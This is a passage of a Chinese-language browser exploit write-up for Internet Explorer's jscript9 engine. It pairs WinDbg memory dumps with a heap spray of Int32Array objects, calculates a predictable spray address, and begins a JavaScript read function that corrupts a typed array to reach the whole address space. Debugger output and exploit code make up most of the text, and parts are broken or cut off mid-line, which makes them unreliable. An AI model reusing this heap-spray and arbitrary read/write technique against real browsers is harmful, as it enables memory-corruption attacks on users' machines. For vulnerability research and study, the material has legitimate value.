    0:007> ln poi(eax)
    (610b38c8)   jscript9!Js::TypedArray::`vftable'   |  (610b3a20)   jscript9!Js::TypedArray::`vftable'
    Exact matches:
        jscript9!Js::TypedArray::`vftable' = 
得到Int32Array对象的地址092b70f0，断下三次后:
    0:007> dd 092b70f0 
    092b70f0  610b38c8 022e9880 00000000 00000003  dd 093b1010
    093b1010  00000000 00003bf8 00003bf8 00000000
    093b1020  092b70c0 092b70f0 092b7120 00000000
    093b1030  00000000 00000000 00000000 00000000
    093b1040  00000000 00000000 00000000 00000000
    093b1050  00000000 00000000 00000000 00000000
    093b1060  00000000 00000000 00000000 00000000
    093b1070  00000000 00000000 00000000 00000000
    093b1080  00000000 00000000 00000000 00000000
填入了三个Int32Array的地址。至于Array[0]处的092b70c0，是在创建Array对象之前构造的，不知道是什么原因。
第二次喷射中每块的大小可以这么计算:
    0x3bf8 数组大小 * 4 bytes + 0x20 头部 + 0x55 * 0x30 每个Int32Array对象大小 
    = 0xfff0
Array在内存中是对齐的，所以每次实际喷射了0x10000 bytes。
喷射完后查看预测地址0c0a0000:
    0c0a0000 00000000 0000eff0 00000000 00000000
    0c0a0010 00000000 00003bf8 00003bf8 00000000
    0c0a0020 0c09fa20 0c09fa50 0c09fa80 0c09fab0
    0c0a0030 0c09fae0 0c09fb10 0c09fb40 0c09fb70
    0c0a0040 0c09fba0 0c09fbd0 0c09fc00 0c09fc30
    0c0a0050 0c09fc60 0c09fc90 0c09fcc0 0c09fcf0
    0c0a0060 0c09fd20 0c09fd50 0c09fd80 0c09fdb0
    0c0a0070 0c09fde0 0c09fe10 0c09fe40 0c09fe70
    0c0a0080 0c09fea0 0c09fed0 0c09ff00 0c09ff30
    0c0a0090 0c09ff60 0c09ff90 0c09ffc0 0c0af000
    0c0a00a0 0c0af030 0c0af060 0c0af090 0c0af0c0
    0c0a00b0 0c0af0f0 0c0af120 0c0af150 0c0af180
    0c0a00c0 0c0af1b0 0c0af1e0 0c0af210 0c0af240
    0c0a00d0 0c0af270 0c0af2a0 0c0af2d0 0c0af300
    0c0a00e0 0c0af330 0c0af360 0c0af390 0c0af3c0
    0c0a00f0 0c0af3f0 0c0af420 0c0af450 0c0af480
    0c0a0100 0c0af4b0 0c0af4e0 0c0af510 0c0af540
    0c0a0110 0c0af570 0c0af5a0 0c0af5d0 0c0af600
    0c0a0120 0c0af630 0c0af660 0c0af690 0c0af6c0
    0c0a0130 0c0af6f0 0c0af720 0c0af750 0c0af780
    0c0a0140 0c0af7b0 0c0af7e0 0c0af810 0c0af840
    0c0a0150 0c0af870 0c0af8a0 0c0af8d0 0c0af900
    0c0a0160 0c0af930 0c0af960 0c0af990 0c0af9c0
    0c0a0170 0c0af9f0 00000000 00000000 00000000
可以在偏移0x3bf8*4处找到Int32Array对象:
    0c0aefe0 00000000 00000000 00000000 00000000
    0c0aeff0 00000000 00000000 00000000 00000000
    0c0af000 610b38c8 022e9880 00000000 00000003 
    	(function() {
    		CollectGarbage();
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i  
改写后可以读写全地址空间，但读写地址时需要是4的倍数，需要实现读写函数解决地址不是4倍数的情况:
    function read(address) {
    	var k = address & 3;
    	if (k == 0) {
    		return int32array[address/4];
    	} else {
    		alert("to debug");
    		return (int32array[(address-k)/4]>>k*8 | (int32array[(address-k+4)/4] << (32-k*8)));